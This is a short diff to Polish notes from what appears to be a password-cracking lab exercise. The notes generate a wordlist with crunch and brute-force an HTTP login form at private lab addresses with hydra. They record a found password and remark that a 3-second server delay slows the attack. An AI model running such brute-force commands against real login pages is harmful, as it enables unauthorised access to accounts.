@@ -9,3 +9,9 @@ goy@!
 Niech regex R = agresoy!@#$%
 ./crunch 4 4 'agresoy!@#$%' -o regex.txt
 hydra -t 64 -l user1 -P regex.txt -s 5000 192.168.0.36 http-post-form "/login:username=^USER^&password=^PASS^:Blad uzytkownika lub hasla"
+
+ETAP 3
+hasło: aaay
+hydra -l user1 -P regex.txt 192.168.100.18 -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:Blad uzytkownika lub hasla" -t 1
+
+opóźnienie 3 sekundy przed wysłaniem POST - znacznie spowalnia hydre, hydra i tak sprawdza wszystkie hasła
